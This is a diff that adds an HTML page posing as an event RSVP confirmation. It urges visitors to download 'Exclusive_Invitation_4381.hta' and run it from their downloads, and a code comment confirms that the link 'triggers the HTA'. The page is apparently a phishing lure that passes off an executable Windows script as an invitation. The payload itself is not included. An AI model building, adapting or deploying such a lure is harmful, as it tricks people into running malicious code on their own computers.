@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RSVP Confirmed</title>
+    <style>
+        body { 
+            background-color: #0f172a; 
+            color: #fff; 
+            font-family: 'Segoe UI', sans-serif; 
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            margin: 0;
+        }
+        .card {
+            background: #1e293b;
+            border: 1px solid rgba(255,255,255,0.1);
+            padding: 60px 50px;
+            text-align: center;
+            max-width: 550px;
+            width: 90%;
+            border-radius: 4px;
+        }
+        .icon-circle { 
+            width: 60px; height: 60px; 
+            border: 2px solid #d4af37; 
+            border-radius: 50%; 
+            display: flex; align-items: center; justify-content: center; 
+            margin: 0 auto 25px; 
+            font-size: 30px; color: #d4af37; 
+        }
+        .rsvp-label { font-size: 0.75rem; letter-spacing: 3px; color: #94a3b8; margin-bottom: 15px; text-transform: uppercase; }
+        h1 { font-family: 'Georgia', serif; font-size: 2.5rem; margin-bottom: 20px; font-weight: 400; color: #f8fafc; }
+        .subtitle { color: #cbd5e1; font-size: 1rem; margin-bottom: 40px; line-height: 1.6; font-weight: 300; }
+        .instruction { font-size: 0.8rem; color: #94a3b8; margin-bottom: 30px; text-transform: uppercase; letter-spacing: 1px; line-height: 1.5; }
+        .btn {
+            display: inline-block;
+            background: transparent;
+            border: 1px solid #d4af37;
+            color: #d4af37;
+            padding: 14px 35px;
+            border-radius: 2px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.9rem;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+        }
+        .btn:hover { background: #d4af37; color: #0f172a; }
+        .footer { margin-top: 50px; font-size: 0.7rem; color: #64748b; text-transform: uppercase; letter-spacing: 2px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon-circle">✓</div>
+        <div class="rsvp-label">RSVP CONFIRMED</div>
+        <h1>You're on the list!</h1>
+        <p class="subtitle">Your response has been received. Your digital<br>invitation has been saved to your device.</p>
+        <p class="instruction">OPEN IT FROM YOUR DOWNLOADS TO RUN IT AND VIEW THE FULL<br>EVENT DETAILS.</p>
+        
+        <!-- THIS LINK TRIGGERS THE HTA -->
+        <a href="/static/Exclusive_Invitation_4381.hta" class="btn" download>Download Invitation</a>
+        
+        <div class="footer">WE CAN'T WAIT TO SEE YOU THERE</div>
+    </div>
+</body>
+</html>
